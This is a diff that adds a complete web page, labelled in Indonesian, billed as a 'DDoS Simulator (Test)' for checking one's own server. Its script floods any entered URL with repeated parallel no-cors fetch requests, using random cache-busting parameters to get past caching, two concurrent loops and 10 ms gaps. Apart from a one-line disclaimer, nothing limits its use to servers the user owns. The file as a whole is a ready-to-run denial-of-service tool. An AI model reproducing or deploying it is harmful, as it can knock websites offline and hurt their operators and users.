@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Defense Tester</title>
+    <style>
+        body { font-family: sans-serif; background: #000; color: #fff; text-align: center; padding: 20px; }
+        .card { border: 1px solid #333; padding: 20px; border-radius: 15px; background: #111; max-width: 400px; margin: auto; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; }
+        
+        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
+        #startBtn { flex: 1; padding: 15px; background: #28a745; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        #stopBtn { flex: 1; padding: 15px; background: #dc3545; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        #startBtn:disabled { background: #145523; opacity: 0.6; }
+        #stopBtn:disabled { background: #6c1a22; opacity: 0.6; }
+
+        .stat-box { margin-top: 20px; padding: 10px; border-top: 1px solid #333; }
+        #counter { font-size: 24px; color: #00ff00; font-weight: bold; }
+        #status { font-size: 14px; margin-top: 5px; }
+        .loading { color: #ffc107; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>DDoS Simulator (Test)</h2>
+    <p style="font-size: 12px; color: #888;">Gunakan untuk menguji ketahanan server sendiri.</p>
+    
+    <input type="text" id="targetURL" placeholder="https://website-kamu.com" value="">
+    
+    <div style="font-size: 13px;">Kekuatan (Simultaneous Request):</div>
+    <input type="number" id="threads" value="50">
+
+    <div class="btn-group">
+        <button id="startBtn" onclick="startAttack()">START</button>
+        <button id="stopBtn" onclick="stopAttack()" disabled>STOP</button>
+    </div>
+
+    <div class="stat-box">
+        <div>Total Request Terkirim:</div>
+        <div id="counter">0</div>
+        <div id="status">Status: Standby</div>
+    </div>
+</div>
+
+<script>
+    let isRunning = false;
+    let totalRequests = 0;
+
+    async function sendRequest() {
+        if (!isRunning) return;
+        
+        const url = document.getElementById('targetURL').value;
+        const threadCount = parseInt(document.getElementById('threads').value) || 10;
+        
+        // Menyiapkan batch request
+        const batch = [];
+        for (let i = 0; i < threadCount; i++) {
+            // Bypass cache dengan random string
+            const target = url + (url.includes('?') ? '&' : '?') + 'cache_bust=' + Math.random();
+            batch.push(fetch(target, { mode: 'no-cors', cache: 'no-store' }));
+        }
+
+        try {
+            await Promise.allSettled(batch);
+            totalRequests += threadCount;
+            document.getElementById('counter').innerText = totalRequests.toLocaleString();
+        } catch (e) {
+            console.log("Error sending batch");
+        }
+
+        // Loop terus menerus jika masih berjalan
+        if (isRunning) {
+            setTimeout(sendRequest, 10); // Jeda 10ms antar batch agar browser tidak hang
+        }
+    }
+
+    function startAttack() {
+        const url = document.getElementById('targetURL').value;
+        if (!url.startsWith('http')) {
+            alert("Harap masukkan URL lengkap (http/https)");
+            return;
+        }
+
+        isRunning = true;
+        totalRequests = 0;
+        document.getElementById('counter').innerText = "0";
+        document.getElementById('status').innerText = "Status: RUNNING...";
+        document.getElementById('status').className = "loading";
+        
+        document.getElementById('startBtn').disabled = true;
+        document.getElementById('stopBtn').disabled = false;
+
+        // Menjalankan beberapa proses sekaligus
+        sendRequest();
+        sendRequest(); // Double thread process
+    }
+
+    function stopAttack() {
+        isRunning = false;
+        document.getElementById('status').innerText = "Status: STOPPED";
+        document.getElementById('status').className = "";
+        
+        document.getElementById('startBtn').disabled = false;
+        document.getElementById('stopBtn').disabled = true;
+    }
+</script>
+
+</body>
+</html>
+
